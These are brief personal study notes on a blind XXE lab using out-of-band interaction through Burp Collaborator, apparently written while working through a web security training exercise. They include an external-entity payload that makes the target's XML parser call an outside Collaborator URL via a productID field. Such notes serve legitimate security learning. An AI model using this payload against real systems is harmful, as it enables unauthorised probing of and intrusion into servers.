Blind XXE with out-of-band interaction:

    -Since this needed to be done in Collaborator options in Burp suite , it only exist in Pro so i cant use it 
    -But this tells us about Blind XXE
    -We send the request to repeter and click collaboartor in burp options to use the url of that.
    -<!DOCTYPE foo [<!ENTITY xxe SYSTEM "URL-OF-COLLABORATOR">]>
    and <productID>&xxe;</productID>
    -Finally send the response